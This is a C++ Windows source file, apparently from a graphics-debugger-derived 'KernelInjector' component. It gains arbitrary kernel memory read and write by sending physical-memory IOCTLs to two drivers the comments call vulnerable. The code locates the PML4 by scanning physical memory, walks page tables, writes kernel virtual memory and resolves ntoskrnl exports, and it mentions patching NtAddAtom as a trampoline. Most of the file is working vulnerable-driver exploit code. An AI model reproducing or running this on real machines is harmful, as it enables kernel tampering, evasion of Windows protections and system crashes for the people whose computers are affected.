/******************************************************************************
 * The MIT License (MIT)
 *
 * Copyright (c) 2014-2026 Baldur Karlsson
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
 * THE SOFTWARE.
 ******************************************************************************/

#include "kernel_mem.h"
#include "nt_internals.h"

#if defined(Q_OS_WIN)

#include <windows.h>
#include <winternl.h>
#include <cstring>
#include <vector>

namespace KernelInjector
{
// ---------------------------------------------------------------------------
// Page table walking
// ---------------------------------------------------------------------------

namespace
{
constexpr size_t kPageSize = 0x1000;
constexpr uint64_t kPhysMask = 0x000FFFFFFFFFF000ULL;
constexpr uint64_t kPtePresent = 0x1;
constexpr uint64_t kPteLargePage = 0x80;

// Physical range scanned for the PML4 page. On Windows the page tables live in
// the first GB of RAM; scanning beyond that risks mapping PCI device memory
// (>= 3GB holes) through MmMapIoSpace, which can machine-check on some
// hardware. The legacy VGA/ROM hole (640KB-1MB) is skipped as well.
constexpr uint64_t kScanStart = 0x0;
constexpr uint64_t kScanEnd = 0x40000000;
constexpr uint64_t kLegacyHoleStart = 0xA0000;
constexpr uint64_t kLegacyHoleEnd = 0x100000;

inline bool IsKernelAddress(uint64_t va)
{
  // Canonical kernel-space address on x64.
  return (va >> 48) == 0xFFFF;
}

// Per-IOCTL transfer cap. Both vulnerable drivers map the whole transfer with a
// single MmMapIoSpace(phys, len, MmNonCached) and then copy to/from the result
// without a NULL check, so a failed map is a guaranteed BSOD 0x3B inside the
// driver (verified in crash dumps: rep movsb faulted with rsi=0). Under VBS the
// kernel refuses to map protected RAM pages PER PAGE (dumps: neighbouring low
// pages mapped fine, one page at 0x106000 refused on every run) - there is no
// size threshold that avoids this, so requests are kept to one page both to
// stay in the common small-mapping path and to minimise what a single failed
// request takes down. The real guard is the VBS check in kernel_injector.cpp
// refusing to run these backends at all while VBS is active.
constexpr size_t kMaxIoChunk = kPageSize;
}    // namespace

bool KernelMem::EnsurePageTable()
{
  if(m_pml4Phys != 0)
    return true;

  if(!FindNtoskrnlBase())
  {
    qWarning() << "KernelInjector: can't resolve ntoskrnl base";
    return false;
  }

  std::vector<uint8_t> chunk(kMaxPhysChunk);

  for(uint64_t base = kScanStart; base < kScanEnd; base += kMaxPhysChunk)
  {
    uint64_t chunkStart = base;
    uint64_t chunkEnd = base + kMaxPhysChunk;

    // Clip the chunk against the legacy hole: don't map VGA memory at all.
    if(chunkStart < kLegacyHoleEnd && chunkEnd > kLegacyHoleStart)
    {
      if(chunkStart < kLegacyHoleStart)
        chunkEnd = kLegacyHoleStart;
      else
        continue;
    }

    size_t readSize = (size_t)(chunkEnd - chunkStart);
    if(!ReadPhys(chunkStart, chunk.data(), readSize))
      continue;

    for(uint64_t off = 0; off + kPageSize <= readSize; off += kPageSize)
    {
      const uint64_t pagePhys = chunkStart + off;
      const uint64_t *entries = (const uint64_t *)(chunk.data() + off);

      // A PML4 page contains one self-referencing entry: an entry that is
      // present and whose page frame number points at the page itself. Only
      // the upper half of the table maps kernel space, so only scan that.
      for(int idx = 256; idx < 512; idx++)
      {
        const uint64_t entry = entries[idx];
        if((entry & kPtePresent) == 0)
          continue;
        if((entry & kPhysMask) != pagePhys)
          continue;

        // Candidate found. Verify it end to end by translating a known kernel
        // address (ntoskrnl base from the user-mode module list) and reading
        // its MZ header back through the walker.
        m_pml4Phys = pagePhys;
        memset(&m_walkCache, 0, sizeof(m_walkCache));

        uint64_t phys = 0;
        char mz[2] = {0, 0};
        if(VirtualToPhysical(m_ntBase, &phys) && ReadPhys(phys, mz, sizeof(mz)) &&
           mz[0] == 'M' && mz[1] == 'Z')
        {
          qInfo() << "KernelInjector: PML4 found at physical 0x" << QString::number(pagePhys, 16);
          return true;
        }

        // Wrong page (or wrong self-reference index), keep scanning.
        m_pml4Phys = 0;
      }
    }
  }

  qWarning() << "KernelInjector: no valid PML4 found in the first GB of physical memory"
             << "(5-level paging / LA57 kernels are not supported by the 4-level walker)";
  return false;
}

bool KernelMem::VirtualToPhysical(uint64_t va, uint64_t *phys)
{
  if(phys == nullptr)
    return false;

  if(!IsKernelAddress(va))
  {
    qWarning() << "KernelInjector: refusing to translate non-kernel address 0x"
               << QString::number(va, 16);
    return false;
  }

  if(!EnsurePageTable())
    return false;

  const uint64_t pml4Idx = (va >> 39) & 0x1FF;
  const uint64_t pdptIdx = (va >> 30) & 0x1FF;
  const uint64_t pdIdx = (va >> 21) & 0x1FF;
  const uint64_t ptIdx = (va >> 12) & 0x1FF;

  const uint64_t pdKey = va >> 30;
  const uint64_t ptKey = va >> 21;
  const uint64_t pageKey = va >> 12;

  uint64_t pml4e = 0;
  if(!ReadPhys(m_pml4Phys + pml4Idx * 8, &pml4e, sizeof(pml4e)))
    return false;
  if((pml4e & kPtePresent) == 0)
    return false;

  uint64_t pdptPhys = pml4e & kPhysMask;
  if(m_walkCache.pdKey != pdKey)
  {
    uint64_t pdpte = 0;
    if(!ReadPhys(pdptPhys + pdptIdx * 8, &pdpte, sizeof(pdpte)))
      return false;
    if((pdpte & kPtePresent) == 0)
      return false;

    if(pdpte & kPteLargePage)
    {
      *phys = (pdpte & kPhysMask) + (va & 0x3FFFFFFF);
      return true;
    }

    m_walkCache.pdPhys = pdpte & kPhysMask;
    m_walkCache.pdKey = pdKey;
  }

  uint64_t pdPhys = m_walkCache.pdPhys;
  if(m_walkCache.ptKey != ptKey)
  {
    uint64_t pde = 0;
    if(!ReadPhys(pdPhys + pdIdx * 8, &pde, sizeof(pde)))
      return false;
    if((pde & kPtePresent) == 0)
      return false;

    if(pde & kPteLargePage)
    {
      *phys = (pde & kPhysMask) + (va & 0x1FFFFF);
      return true;
    }

    m_walkCache.ptPhys = pde & kPhysMask;
    m_walkCache.ptKey = ptKey;
  }

  uint64_t ptPhys = m_walkCache.ptPhys;
  if(m_walkCache.pageKey != pageKey)
  {
    uint64_t pte = 0;
    if(!ReadPhys(ptPhys + ptIdx * 8, &pte, sizeof(pte)))
      return false;
    if((pte & kPtePresent) == 0)
      return false;

    m_walkCache.pagePhys = pte & kPhysMask;
    m_walkCache.pageKey = pageKey;
  }

  *phys = m_walkCache.pagePhys + (va & 0xFFF);
  return true;
}

bool KernelMem::ReadVirtual(uint64_t va, void *buf, size_t size)
{
  uint8_t *out = (uint8_t *)buf;

  while(size > 0)
  {
    uint64_t phys = 0;
    if(!VirtualToPhysical(va, &phys))
      return false;

    size_t chunk = (size_t)(kPageSize - (phys & (kPageSize - 1)));
    if(chunk > size)
      chunk = size;

    if(!ReadPhys(phys, out, chunk))
      return false;

    va += chunk;
    out += chunk;
    size -= chunk;
  }

  return true;
}

bool KernelMem::WriteVirtual(uint64_t va, const void *buf, size_t size)
{
  const uint8_t *in = (const uint8_t *)buf;

  while(size > 0)
  {
    uint64_t phys = 0;
    if(!VirtualToPhysical(va, &phys))
      return false;

    size_t chunk = (size_t)(kPageSize - (phys & (kPageSize - 1)));
    if(chunk > size)
      chunk = size;

    if(!WritePhys(phys, in, chunk))
      return false;

    va += chunk;
    in += chunk;
    size -= chunk;
  }

  return true;
}

// ---------------------------------------------------------------------------
// ntoskrnl exports
// ---------------------------------------------------------------------------

bool KernelMem::FindNtoskrnlBase()
{
  if(m_ntBase != 0)
    return true;

  ULONG size = 0;
  NTSTATUS status =
      NtQuerySystemInformation(NtInternals::SystemModuleInformation, nullptr, 0, &size);
  if(status != STATUS_INFO_LENGTH_MISMATCH)
    return false;

  std::vector<uint8_t> buffer(size);
  status = NtQuerySystemInformation(NtInternals::SystemModuleInformation, buffer.data(), size,
                                    nullptr);
  if(!NT_SUCCESS(status))
    return false;

  // First module in the list is always the kernel image.
  const NtInternals::RtlModuleList *info = (const NtInternals::RtlModuleList *)buffer.data();
  if(info->Modules[0].ImageBase == nullptr)
    return false;

  m_ntBase = (uint64_t)info->Modules[0].ImageBase;
  qInfo() << "KernelInjector: ntoskrnl at 0x" << QString::number(m_ntBase, 16);
  return true;
}

uint64_t KernelMem::FindModuleExport(uint64_t moduleBase, const char *name)
{
  if(moduleBase == 0)
    return 0;

  IMAGE_DOS_HEADER dos;
  if(!ReadVirtual(moduleBase, &dos, sizeof(dos)) || dos.e_magic != IMAGE_DOS_SIGNATURE)
    return 0;

  IMAGE_NT_HEADERS64 nt;
  if(!ReadVirtual(moduleBase + dos.e_lfanew, &nt, sizeof(nt)) || nt.Signature != IMAGE_NT_SIGNATURE)
    return 0;

  const IMAGE_DATA_DIRECTORY &exp =
      nt.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
  if(exp.VirtualAddress == 0 || exp.Size == 0 || exp.Size > 8 * 1024 * 1024)
    return 0;

  std::vector<uint8_t> exportData(exp.Size);
  if(!ReadVirtual(moduleBase + exp.VirtualAddress, exportData.data(), exportData.size()))
    return 0;

  const IMAGE_EXPORT_DIRECTORY *dir = (const IMAGE_EXPORT_DIRECTORY *)exportData.data();

  // Validate the sub-table ranges up front so malformed export directories
  // cannot walk the pointers out of the buffer.
  const uint64_t expEnd = (uint64_t)exp.VirtualAddress + exp.Size;
  if(dir->AddressOfNames < exp.VirtualAddress ||
     (uint64_t)dir->AddressOfNames + (uint64_t)dir->NumberOfNames * 4 > expEnd ||
     dir->AddressOfNameOrdinals < exp.VirtualAddress ||
     (uint64_t)dir->AddressOfNameOrdinals + (uint64_t)dir->NumberOfNames * 2 > expEnd ||
     dir->AddressOfFunctions < exp.VirtualAddress ||
     (uint64_t)dir->AddressOfFunctions + (uint64_t)dir->NumberOfFunctions * 4 > expEnd)
    return 0;

  const uint32_t *names = (const uint32_t *)(exportData.data() + (dir->AddressOfNames - exp.VirtualAddress));
  const uint16_t *ordinals =
      (const uint16_t *)(exportData.data() + (dir->AddressOfNameOrdinals - exp.VirtualAddress));
  const uint32_t *functions =
      (const uint32_t *)(exportData.data() + (dir->AddressOfFunctions - exp.VirtualAddress));

  for(uint32_t i = 0; i < dir->NumberOfNames; i++)
  {
    uint32_t nameRva = names[i];
    if(nameRva < exp.VirtualAddress || nameRva >= exp.VirtualAddress + exp.Size)
      continue;

    const char *cand = (const char *)(exportData.data() + (nameRva - exp.VirtualAddress));
    if(strcmp(cand, name) != 0)
      continue;

    uint32_t ordinal = ordinals[i];
    if(ordinal >= dir->NumberOfFunctions)
      continue;

    uint32_t funcRva = functions[ordinal];
    if(funcRva == 0)
      return 0;

    uint64_t addr = moduleBase + funcRva;
    // Forwarded exports point back into the export directory - reject them.
    if(addr >= moduleBase + exp.VirtualAddress && addr < moduleBase + exp.VirtualAddress + exp.Size)
      return 0;

    return addr;
  }

  return 0;
}

// ---------------------------------------------------------------------------
// portwell backend
// ---------------------------------------------------------------------------

PortwellBackend::PortwellBackend(void *deviceHandle) : m_device(deviceHandle) {}
PortwellBackend::~PortwellBackend() {}

bool PortwellBackend::ReadPhys(uint64_t phys, void *buf, size_t size)
{
  uint8_t *out = (uint8_t *)buf;

  while(size > 0)
  {
    size_t chunk = size > kMaxIoChunk ? kMaxIoChunk : size;

    PortwellProtocol::PhysRwRequest req;
    req.phys = phys;
    req.unit = 1;
    req.count = (uint32_t)chunk;

    DWORD returned = 0;
    if(!DeviceIoControl((HANDLE)m_device, PortwellProtocol::kIoctlReadPhys, &req, sizeof(req), out,
                        (DWORD)chunk, &returned, nullptr) ||
       returned != chunk)
      return false;

    phys += chunk;
    out += chunk;
    size -= chunk;
  }

  return true;
}

bool PortwellBackend::WritePhys(uint64_t phys, const void *buf, size_t size)
{
  const uint8_t *in = (const uint8_t *)buf;

  // The driver copies data that follows the 16-byte request header, so the
  // input buffer is header + data.
  std::vector<uint8_t> input(sizeof(PortwellProtocol::PhysRwRequest) + kMaxIoChunk);

  while(size > 0)
  {
    size_t chunk = size > kMaxIoChunk ? kMaxIoChunk : size;

    PortwellProtocol::PhysRwRequest *req = (PortwellProtocol::PhysRwRequest *)input.data();
    req->phys = phys;
    req->unit = 1;
    req->count = (uint32_t)chunk;
    memcpy(input.data() + sizeof(PortwellProtocol::PhysRwRequest), in, chunk);

    DWORD returned = 0;
    if(!DeviceIoControl((HANDLE)m_device, PortwellProtocol::kIoctlWritePhys, input.data(),
                        (DWORD)(sizeof(PortwellProtocol::PhysRwRequest) + chunk), nullptr, 0,
                        &returned, nullptr))
      return false;

    phys += chunk;
    in += chunk;
    size -= chunk;
  }

  return true;
}

bool PortwellBackend::SelfTest()
{
  // Read a region of ntoskrnl spanning more than one page and validate both
  // the DOS and PE signatures. This exercises the VA->PA walker (including
  // its per-level cache) and the read primitive against values we know.
  if(!FindNtoskrnlBase())
    return false;

  uint8_t header[0x800];
  if(!ReadVirtual(NtoskrnlBase(), header, sizeof(header)))
    return false;

  const IMAGE_DOS_HEADER *dos = (const IMAGE_DOS_HEADER *)header;
  if(dos->e_magic != IMAGE_DOS_SIGNATURE || dos->e_lfanew + 4 > sizeof(header))
    return false;

  if(memcmp(header + dos->e_lfanew, "PE\0\0", 4) != 0)
    return false;

  // Write path: round-trip the first kernel-half PML4 entry (index 256). It
  // is present since boot and never remapped at runtime, so writing the value
  // just read back is idempotent with no lasting side effect - unlike TBT
  // there is no allocation primitive for a scratch page. A wrong write
  // protocol guess fails here instead of on the first real kernel write (the
  // NtAddAtom trampoline patch).
  if(m_pml4Phys != 0)
  {
    const uint64_t entryPhys = m_pml4Phys + 256 * 8;
    uint64_t entry = 0, readback = 0;
    if(ReadPhys(entryPhys, &entry, sizeof(entry)) && (entry & kPtePresent))
    {
      if(!WritePhys(entryPhys, &entry, sizeof(entry)) ||
         !ReadPhys(entryPhys, &readback, sizeof(readback)) || readback != entry)
      {
        qWarning() << "KernelInjector: portwell write round-trip failed in self-test";
        return false;
      }
    }
    else
    {
      qWarning() << "KernelInjector: portwell write self-test skipped (PML4[256] not readable)";
    }
  }

  qInfo() << "KernelInjector: portwell backend self-test passed";
  return true;
}

// ---------------------------------------------------------------------------
// TBT backend
// ---------------------------------------------------------------------------

TbtBackend::TbtBackend(void *deviceHandle) : m_device(deviceHandle) {}
TbtBackend::~TbtBackend() {}

bool TbtBackend::ReadPhys(uint64_t phys, void *buf, size_t size)
{
  uint8_t *out = (uint8_t *)buf;

  while(size > 0)
  {
    size_t chunk = size > kMaxIoChunk ? kMaxIoChunk : size;

    // Request layout: {qword phys, byte unit}. The byte count is derived by
    // the driver from the output buffer length.
    uint8_t request[9];
    memcpy(&request[0], &phys, sizeof(phys));
    request[8] = 1;

    DWORD returned = 0;
    if(!DeviceIoControl((HANDLE)m_device, TbtProtocol::kIoctlReadPhys, request, sizeof(request),
                        out, (DWORD)chunk, &returned, nullptr) ||
       returned != chunk)
      return false;

    phys += chunk;
    out += chunk;
    size -= chunk;
  }

  return true;
}

bool TbtBackend::WritePhys(uint64_t phys, const void *buf, size_t size)
{
  const uint8_t *in = (const uint8_t *)buf;

  // Request layout: {qword phys, byte unit, dword count, data...}
  const size_t kHeader = 13;
  std::vector<uint8_t> input(kHeader + kMaxIoChunk);

  while(size > 0)
  {
    size_t chunk = size > kMaxIoChunk ? kMaxIoChunk : size;

    uint32_t count = (uint32_t)chunk;
    memcpy(&input[0], &phys, sizeof(phys));
    input[8] = 1;
    memcpy(&input[9], &count, sizeof(count));
    memcpy(input.data() + kHeader, in, chunk);

    DWORD returned = 0;
    if(!DeviceIoControl((HANDLE)m_device, TbtProtocol::kIoctlWritePhys, input.data(),
                        (DWORD)(kHeader + chunk), nullptr, 0, &returned, nullptr))
      return false;

    phys += chunk;
    in += chunk;
    size -= chunk;
  }

  return true;
}

bool TbtBackend::AllocContiguous(uint32_t size, uint64_t highestAddr, uint64_t *outPhys,
                                 uint64_t *outVa)
{
  if(outPhys == nullptr || outVa == nullptr)
    return false;

  // Input: exactly 12 bytes {dword size, qword highestAddress}. Output: 16
  // bytes {qword phys @+0, qword va @+8}, written back by the driver.
  uint8_t input[12] = {0};
  memcpy(&input[0], &size, sizeof(size));
  memcpy(&input[4], &highestAddr, sizeof(highestAddr));

  uint8_t output[16] = {0};

  DWORD returned = 0;
  if(!DeviceIoControl((HANDLE)m_device, TbtProtocol::kIoctlAllocContiguous, input, sizeof(input),
                      output, sizeof(output), &returned, nullptr) ||
     returned != sizeof(output))
    return false;

  uint64_t allocPhys = 0, allocVa = 0;
  memcpy(&allocPhys, &output[0], sizeof(allocPhys));
  memcpy(&allocVa, &output[8], sizeof(allocVa));

  if(allocPhys == 0 || allocVa == 0)
    return false;

  *outPhys = allocPhys;
  *outVa = allocVa;
  return true;
}

bool TbtBackend::FreeContiguous(uint64_t va)
{
  // Request layout: the VA lives at offset +8 of a 16-byte buffer.
  uint8_t buffer[16] = {0};
  memcpy(&buffer[8], &va, sizeof(va));

  DWORD returned = 0;
  return DeviceIoControl((HANDLE)m_device, TbtProtocol::kIoctlFreeContiguous, buffer,
                         sizeof(buffer), nullptr, 0, &returned, nullptr) != FALSE;
}

bool TbtBackend::SelfTest()
{
  // Read path: same cross-page ntoskrnl header validation as portwell.
  if(!FindNtoskrnlBase())
    return false;

  uint8_t header[0x800];
  if(!ReadVirtual(NtoskrnlBase(), header, sizeof(header)))
    return false;

  const IMAGE_DOS_HEADER *dos = (const IMAGE_DOS_HEADER *)header;
  if(dos->e_magic != IMAGE_DOS_SIGNATURE || dos->e_lfanew + 4 > sizeof(header))
    return false;

  if(memcmp(header + dos->e_lfanew, "PE\0\0", 4) != 0)
    return false;

  // Write path: allocate a contiguous page, write a pattern through the
  // physical write primitive, read it back, compare, free.
  uint64_t allocPhys = 0, allocVa = 0;
  if(!AllocContiguous(0x1000, 0xFFFFFFFFFFFFFULL, &allocPhys, &allocVa))
  {
    qWarning() << "KernelInjector: TBT contiguous allocation failed in self-test";
    return false;
  }

  const uint64_t pattern = 0x5445425452455052ULL;    // "REPERTBET" marker
  bool ok = WritePhys(allocPhys, &pattern, sizeof(pattern));
  if(ok)
  {
    uint64_t readback = 0;
    ok = ReadPhys(allocPhys, &readback, sizeof(readback)) && readback == pattern;
  }

  if(!FreeContiguous(allocVa))
    qWarning() << "KernelInjector: TBT free failed in self-test";

  if(!ok)
  {
    qWarning() << "KernelInjector: TBT write/read round-trip failed in self-test";
    return false;
  }

  qInfo() << "KernelInjector: TBT backend self-test passed";
  return true;
}
}    // namespace KernelInjector

#endif    // Q_OS_WIN
